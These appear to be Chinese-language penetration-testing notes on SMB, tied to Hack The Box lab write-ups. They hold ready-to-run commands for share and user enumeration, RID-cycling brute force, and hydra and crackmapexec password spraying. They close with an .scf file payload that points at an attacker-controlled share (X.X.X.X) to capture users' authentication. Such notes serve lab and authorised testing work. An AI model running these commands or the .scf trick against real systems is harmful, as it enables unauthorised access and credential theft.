# smb

## nmap 脚本

<https://nmap.org/nsedoc/scripts/>

常用：

- smb-os-discovery.nse：探测 SMB 服务的操作系统版本
- smb-enum-shares.nse：枚举 SMB 服务的共享目录
- smb-enum-users.nse：枚举 SMB 服务的用户列表
- smb-enum-sessions.nse：枚举 SMB 服务的会话列表
- smb-enum-processes.nse：枚举 SMB 服务的进程列表
- smb-enum-domains.nse：枚举 SMB 服务的域列表

```shell
nmap -p139,445 -n -sV --script "smb* and not brute" <IP>
```

## metasploit smb 版本探测

```shell
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.112.38
run
```

## smbmap

```shell
# 尝试枚举smb服务器的共享目录
smbmap -H <IP>
smbmap -H <IP> -u <username> -p <password>
```

## enum4linux

获取所有信息（用户、组、共享、策略等）

```shell
enum4linux -a -o <IP>
```

## crackmapexec

空会话访问，获取共享

```shell
crackmapexec smb 10.10.11.236 --shares
```

任意用户名访问，获取共享

```shell
crackmapexec smb 10.10.11.236 -u "somebody" -p "" --shares
```

## RID 循环攻击（爆破用户名）

### crackmapexec

```shell
crackmapexec smb 10.10.11.236 -u "elswix" -p "" --rid-brute
```

### impacket

<https://0xdf.gitlab.io/2024/03/16/htb-manager.html#smb---tcp-445>

```shell
impacket-lookupsid somebody@manager.htb -no-pass
```

## 密码爆破

```shell
hydra -l <username> -P <password> <IP> smb
```

```shell
crackmapexec smb 192.168.1.101 -u user1 user2 user3 -p Summer18             #多个用户，一个密码进行喷晒
crackmapexec smb 192.168.1.101 -u /path/to/users.txt -p Summer18            #使用users.txt 用户列表文件指定多用户喷晒
crackmapexec smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt   #爆破administrator用户密码
```

## smbclient 使用

Smbclient 是一个用于连接 SMB 服务的客户端工具，可以用于在渗透测试中枚举和访问共享文件、资源和服务。Smbclient 的使用方法如下：

- 可以使用 smbclient 命令来连接 SMB 服务，其基本语法是：
  - `smbclient //[host]/[share] -U [user]`
  - 其中，[host] 是目标主机的 IP 地址或主机名，[share] 是要访问的共享名，[user] 是要使用的用户名，如果不指定，则默认为 guest。
  - 例如，如果要以 guest 用户连接到 192.168.1.100 主机的 public 共享，可以使用以下命令：
    - `smbclient //192.168.1.100/public -U guest`
  - 如果要以指定的密码连接，可以在用户名后加上%符号和密码，例如：
    - `smbclient //192.168.1.100/public -U guest%123456`
- 连接成功后，会进入一个类似于 FTP 的交互式 shell，可以使用一些常用的命令来操作共享文件和资源，例如：
  - `ls`：列出当前目录下的文件和子目录
  - `cd`：切换目录
  - `get`：下载文件到本地
  - `put`：上传文件到远程
  - `mget`：批量下载文件
  - `mput`：批量上传文件
  - `del`：删除文件
  - `mkdir`：创建目录
  - `rmdir`：删除目录
  - `exit`：退出 smbclient
- 如果不知道目标主机的共享名，可以使用-L 选项来列出所有可用的共享，其语法是：
  - `smbclient -L [host] -U [user]`
  - 例如，如果要以 guest 用户列出 192.168.1.100 主机的所有共享，可以使用以下命令：
    - `smbclient -L 192.168.1.100 -U guest`
- smbclient 还支持一些高级选项和功能，例如：
  - `-N`：不使用密码进行连接
  - `-I`：指定目标主机的 IP 地址，而不是通过 NetBIOS 名称解析
  - `-p`：指定 SMB 服务的端口号，默认为 139
  - `-c`：执行指定的命令，而不进入交互式 shell
  - `-E`：将错误信息输出到标准错误流
  - `-d`：设置调试级别，范围为 0-10
  - `-t`：指定 SMB 协议的超时时间，单位为秒
  - `-A`：指定一个包含用户名和密码的文件，而不是交互式输入
  - `-M`：向指定的主机发送一个消息，类似于 net send 命令
  - `-T`：使用 tar 格式备份或还原文件
  - `-R`：指定要使用的名称解析顺序，例如 bcast, wins, hosts, lmhosts
  - `-n`：指定要使用的 NetBIOS 名称，而不是从配置文件中读取
  - `-m`：指定要使用的 SMB 协议版本，例如 SMB1, SMB2, SMB3
  - `-P`：指定是否使用 SMB 签名，0 表示禁用，1 表示启用，2 表示必需
  <!-- - `-e`：指定是否使用 SMB 加密，0 表示禁用，1 表示启用，2 表示必需 -->
  - `-k`：指定是否使用 Kerberos 认证，需要配置 krb5.conf 文件
  <!-- - `-C`：指定是否使用压缩传输数据，需要 SMB3 协议支持 -->
  <!-- - `-S`：指定是否使用匿名共享，而不是 IPC$ -->
  - `-s`：指定 smbclient 的配置文件，而不是默认的 smb.conf

## .scf文件攻击

适用于smb服务文件内容可控，用户浏览该文件时执行该文件

```scf
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

<https://0xdf.gitlab.io/2022/02/26/htb-driver.html>

<https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/>

(1) SMB 渗透测试常规思路_smb 截图 渗透_redwand 的博客 .... <https://blog.csdn.net/redwand/article/details/113730414>.

(2) 渗透测试之 SMB 枚举指南 - 知乎。<https://zhuanlan.zhihu.com/p/356104384>.

(3) 黑客靶场练习 (SMB 匿名登录，制作反弹 shell, 一键提权） - 知乎。<https://zhuanlan.zhihu.com/p/385973632>.

(4) 常见的端口服务渗透 (1.SMB 端口渗透） - 知乎。<https://zhuanlan.zhihu.com/p/377692326>.

(5) 渗透测试中 SMB 服务（139、445 端口）枚举汇总 - 腾讯云。<https://cloud.tencent.com/developer/article/1615418>.

(6) undefined. <https://nmap.org>.

(7) undefined. <https://nmap.org/submit/>.
